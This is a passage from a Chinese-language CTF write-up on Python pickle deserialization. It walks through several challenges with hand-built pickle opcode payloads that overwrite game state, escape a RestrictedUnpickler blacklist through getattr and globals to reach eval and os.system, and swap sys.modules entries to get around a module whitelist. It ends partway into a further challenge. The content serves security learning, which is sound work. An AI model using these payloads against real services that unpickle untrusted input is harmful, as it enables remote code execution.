            return self.round_count >= max_round
    ​
        def is_win(self):
            return self.win_count == max_round
只要能控制住 curr_ticket，每局就能稳赢，或者直接将 win_count 设为 10，能实现吗？
先试试覆盖 win_count 和 round_count。换句话来说，就是需要在反序列化 Ticket 对象前执行：
    from guess_game import game  # __init__.py  game = Game()
    game.round_count = 10
    game.win_count = 10
pickle 里并不能直接用等号赋值，但有对应的指令用来改变属性。
    BUILD = b'b'   # call __setstate__ or __dict__.update()
    # 具体实现在 pickle.py 的 1546 行
开始构造
    cguess_game
    game
    }S'round_count'
    I10
    sS'win_count'
    I10
    sb
其中，} 是往 stack 中压入一个空 dict，s 是将键值对插入到 dict。
测试一下效果，成功。
到这就做完了吗？不，还有个小验证，assert type(ticket) == Ticket。
之前提到过，pickle 序列流执行完后将把栈顶的值返回，那结尾再留一个 Ticket 的对象就好了。
    ticket = Ticket(6)
    res = pickle.dumps(ticket)  # 这里不能再用 0 号协议，否则会出现 ccopy_reg\n_reconstructor
    print(res)
    '''
    \x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.
    '''
最终 payload：
    cguess_game\ngame\n}S"win_count"\nI10\nsS"round_count"\nI9\nsbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.
尝试覆盖掉 current_ticket：
    cguess_game\n
    game
    }S'curr_ticket'
    cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sbp0
    sbg0
    .
这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。
最终 payload：
    cguess_game\ngame\n}S'curr_ticket'\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x07sbp0\nsbg0\n.
### Code-Breaking 2018 picklecode
> 完整源码： 
    import pickle
    import io
    import builtins
    __all__ = ('PickleSerializer', )
    class RestrictedUnpickler(pickle.Unpickler):
        blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}
        def find_class(self, module, name):
            # Only allow safe classes from builtins.
            if module == "builtins" and name not in self.blacklist:
                return getattr(builtins, name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                         (module, name))
    class PickleSerializer():
        def dumps(self, obj):
            return pickle.dumps(obj)
        def loads(self, data):
            try:
                if isinstance(data, str):
                    raise TypeError("Can't load pickle from unicode string")
                file = io.BytesIO(data)
                return RestrictedUnpickler(file,
                                  encoding='ASCII', errors='strict').load()
            except Exception as e:
                return {}
这只是原题的一部分，重点关注下这个沙箱如何逃逸。先看个东西：
    >>> getattr(globals()['__builtins__'], 'eval')
    >>> getattr(dict.get(globals(), '__builtins__'), 'eval')
getattr 和 globals 并没有被禁，那就尝试写 pickle 吧。
    cbuiltins
    getattr
    (cbuiltins
    dict
    S'get'
    tRp100
    (cbuiltins
    globals
    (tRS'__builtins__'
    tRp101
    0g100
    (g101
    S'eval'
    tR(S'__import__("os").system("dir")'
    tR.
PS：我的环境是 Python 3.7.4，反序列化时获取到的 builtins 是一个 dict，所以用了两次 get，视环境进行调整吧。这个
payload 在 Python 3.7.3 又跑不起来 ：）
### BalsnCTF 2019 Pyshv1
> 环境：
> 
    # File: securePickle.py
    import pickle, io
    whitelist = []
    # See https://docs.python.org/3.7/library/pickle.html#restricting-globals
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            if module not in whitelist or '.' in name:
                raise KeyError('The pickle is spoilt :(')
            return pickle.Unpickler.find_class(self, module, name)
    def loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()
    dumps = pickle.dumps
    # File: server.py
    import securePickle as pickle
    import codecs
    pickle.whitelist.append('sys')
    class Pysh(object):
        def __init__(self):
            self.login()
            self.cmds = {}
        def login(self):
            user = input().encode('ascii')
            user = codecs.decode(user, 'base64')
            user = pickle.loads(user)
            raise NotImplementedError("Not Implemented QAQ")
        def run(self):
            while True:
                req = input('$ ')
                func = self.cmds.get(req, None)
                if func is None:
                    print('pysh: ' + req + ': command not found')
                else:
                    func()
    if __name__ == '__main__':
        pysh = Pysh()
        pysh.run()
限制了导入的模块只能是 sys，问题是这个模块也不安全呀 ：）
> sys.modules
>
> This is a dictionary that maps module names to modules which have already
> been loaded. This can be manipulated to force reloading of modules and other
> tricks. However, replacing the dictionary will not necessarily work as
> expected and deleting essential items from the dictionary may cause Python
> to fail.
如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库是默认被加载进来的，例如 os，但是不能直接使用，原因在于
sys.modules 中未经 import 加载的模块对当前空间是不可见的。
这里的 find_class 直接调的 pickle.py 中的方法，那就先看看它如何导入包的：
    # pickle.Unpickler.find_class
    def find_class(self, module, name):
        # Subclasses may override this.
        if self.proto = 4:
            return _getattribute(sys.modules[module], name)[0]
        else:
            return getattr(sys.modules[module], name)
其中 sys.modules 为：
    {	
        'sys':  ,
        'builtins':  ,
        'os':  ,
    }
那我们的目标：
    cos\nsystem   getattr(sys.modules['os'], 'system')
限制了 module 只能为 sys，那能否把 sys.modules[‘sys’]替换为sys.modules[‘os’]，从而引入危险模块。
    from sys import modules
    modules['sys'] = modules['os']
    from sys import system
本地实验一下，成功：
    PS C:\Users\wywwzjj> python
    Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)] on win32
    Type "help", "copyright", "credits" or "license" for more information.
    >>> from sys import modules
    >>> modules['sys'] = modules['os']
    >>> from sys import system
    >>> system('dir')
     驱动器 C 中的卷没有标签。
     卷的序列号是 F497-F727
     C:\Users\wywwzjj 的目录
    2019/10/15  20:36              .
    2019/10/15  20:36              ..
    2019/08/22  21:02             2,750 .aggressor.prop
    2019/09/16  00:09              .anaconda
    2019/04/09  13:58              .android
    2018/12/13  14:37              .astropy
    2019/10/15  20:36            18,465 .bash_history
    2019/04/07  12:03              .CLion2019.1
还有个小麻烦，modules 是个 dict，无法直接取值。继续利用 getattr(sys.modules[module], name)。
    >>> import sys
    >>> sys.modules['sys'] = sys.modules
    >>> import sys
    >>> dir(sys)  # 成功导入 dict 对象
    ['__class__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'copy', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']
    >>> getattr(sys, 'get')  # 结合 find_class 中的 getattr
改写成 pickle：
    csys
    modules
    p100
    S'sys'
    g100
    scsys
    get
    (S'os'
    tRp101
    0S'sys'
    g101
    scsys
    system
    (S'dir'
    tR.
### BalsnCTF 2019 Pyshv2
> 环境：
> 
    # File: securePickle.py
    import pickle
    import io
    whitelist = []
    # See https://docs.python.org/3.7/library/pickle.html#restricting-globals
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            if module not in whitelist or '.' in name:
                raise KeyError('The pickle is spoilt :(')
            module = __import__(module)
            return getattr(module, name)
    def loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()
    dumps = pickle.dumps
    # File: server.py
    import securePickle as pickle
    import codecs